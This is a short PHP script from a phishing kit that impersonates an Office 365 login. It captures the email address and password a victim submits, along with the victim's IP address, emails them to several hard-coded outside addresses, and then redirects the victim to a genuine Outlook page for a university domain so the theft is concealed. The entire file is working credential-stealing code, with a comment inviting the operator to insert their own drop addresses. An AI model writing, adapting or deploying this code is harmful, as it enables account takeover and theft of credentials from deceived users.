<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office365 Info-----------------------\n";
$message .= "Email            : ".$_POST['userid']."\n";
$message .= "Password            : ".$_POST['passwd']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY HACK3R_L3L3-------------\n";
//Change Your Email Here...
$send = "arnir.litchi@gmail.com, android-sever6@t-online.de, thomasray0404@gmail.com";
$subject = "Result from Office-365";
$headers = "From: Office-365 <customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

		   header("Location: https://outlook.office365.com/owa/live.ucl.ac.uk");

	 
?>